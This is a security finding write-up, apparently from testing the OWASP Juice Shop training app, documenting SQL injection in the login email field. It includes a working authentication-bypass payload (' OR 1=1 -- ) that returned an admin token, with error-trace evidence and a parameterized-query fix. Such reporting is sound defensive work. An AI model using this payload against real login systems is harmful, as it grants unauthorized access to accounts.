## SQL Injection in Login Email Field

**Endpoint:** POST /rest/user/login
**Parameter:** email (JSON body)
**Vulnerability Class:** SQL Injection (Error-based)

### Detection Payloads

1. `' trash` — triggered a 500 Internal Server Error with Sequelize/SQLite stack trace in response body.
2. `' OR 1=1 -- ` — returned HTTP 200 with a valid JWT authentication token for the admin user (email: admin@juice-sh.op, role: admin, id: 1). This confirms both SQL injection and authentication bypass.

### Evidence

- Single quote probe (`' trash`) returned 500 with stack trace showing: `at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)`
- `' OR 1=1 -- ` probe bypassed authentication entirely, returning a JWT token with admin privileges:
  ```json
  {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...","bid":1,"umail":"admin@juice-sh.op"}}
  ```
  Token payload includes: `"id":1, "email":"admin@juice-sh.op", "role":"admin"`

### Impact

An attacker can authenticate as any user (including admin) without valid credentials by injecting SQL into the email field.

### Recommendation

Use parameterized queries/prepared statements for all database queries. The Sequelize ORM should already provide protection — verify that raw query concatenation is not being used for the login logic.